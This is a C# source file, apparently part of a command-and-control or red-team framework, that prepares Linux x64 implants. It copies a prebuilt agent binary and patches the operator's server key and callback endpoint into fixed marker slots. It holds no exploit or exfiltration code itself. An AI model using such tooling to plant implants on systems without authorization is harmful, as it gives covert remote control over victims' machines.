using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Common.Payload
{
    public partial class PayloadGenerator
    {
        public byte[] ElfPrepare(ImplantConfig options)
        {
            if(options.Architecture != ImplantArchitecture.x64)
            {
                throw new NotSupportedException("Seule l'architecture x64 est supportée pour les implants Linux.");
            }

            var srcBinary = File.ReadAllBytes(this.Source("AgentLinux", options.Architecture, options.IsDebug));
            PatchKey(srcBinary, "[KEY]", options.ServerKey);
            PatchKey(srcBinary, "[ENDPOINT]", options.Endpoint.ToString());
            return srcBinary;
        }

        public static byte[] PatchKey(byte[] binary, string marker, string newKey)
        {
            const int TOTAL_LENGTH = 128;

            // Lit le binaire
            byte[] markerBytes = Encoding.ASCII.GetBytes(marker.PadRight(TOTAL_LENGTH, '*'));

            // Trouve l'offset du marker
            int offset = FindPattern(binary, markerBytes);
            if (offset == -1)
            {
                throw new Exception($"Marker '{marker}' not found on binary file");
            }

            if (newKey.Length > TOTAL_LENGTH)
            {
                throw new Exception($"Value '{newKey}' is too long");
            }
            // Prépare la nouvelle valeur (padding avec *)
            string paddedKey = newKey.PadRight(TOTAL_LENGTH, '*');

            string fullValue = paddedKey;
            byte[] newBytes = Encoding.ASCII.GetBytes(fullValue);

            // Remplace dans le binaire
            Array.Copy(newBytes, 0, binary, offset, newBytes.Length);

            // Sauvegarde

            //Console.WriteLine($"✓ Clé patchée à l'offset {offset} : {MARKER}{paddedKey.Substring(0, Math.Min(10, paddedKey.Length))}...");
            return binary;
        }

        private static int FindPattern(byte[] data, byte[] pattern)
        {
            for (int i = 0; i <= data.Length - pattern.Length; i++)
            {
                bool found = true;
                for (int j = 0; j < pattern.Length; j++)
                {
                    if (data[i + j] != pattern[j])
                    {
                        found = false;
                        break;
                    }
                }
                if (found) return i;
            }
            return -1;
        }
    }
}
